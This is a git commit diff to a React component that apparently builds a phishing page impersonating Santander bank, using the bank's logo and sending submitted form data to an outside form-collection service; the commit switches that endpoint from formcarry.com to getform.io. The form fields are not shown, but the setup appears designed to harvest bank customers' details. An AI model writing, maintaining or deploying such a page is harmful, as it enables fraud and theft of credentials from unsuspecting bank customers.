9ee8e25551d41ddd559950a79b4c99df3a488532
alosantader <alosantamex@gmail.com>
2024-08-03 22:28:35 -0500

    Update primerapag.jsx

--- src/components/primerapag.jsx
+++ src/components/primerapag.jsx
@@ -11,7 +11,7 @@ function Primerapag() {
     const formData = new FormData(event.target);
     
     try {
-      const response = await fetch('https://formcarry.com/s/LInx79bvVGc', {
+      const response = await fetch('https://getform.io/f/axojvkpb', {
         method: 'POST',
         body: formData,
         headers: {
@@ -34,7 +34,7 @@ function Primerapag() {
     <div className="santander-container">
       <div className="santander-header">
         <span className="santander-logo">
-          <img style={{ width: '160px' }} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="" />
+          <img style={{ width: '160px' }} src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg-XzSWZdtf3Lgk80cOwX_lyUAiAGOkQer4gLjKSlGD1_Lso4yPSiWbUTVw-ssFpCkB2I-e4_gAGp3PFTz6uKHDMX3hD8QcVDWegy5jXJ4oOpTmXOzCTVoOEj5H0V_mKgxE9y9aAj5deqw/s640/logo+santander+nuevo2.jpg" alt="Logo Santander" />
         </span>
       </div>
       <form className="santander-form" onSubmit={handleSubmit}>
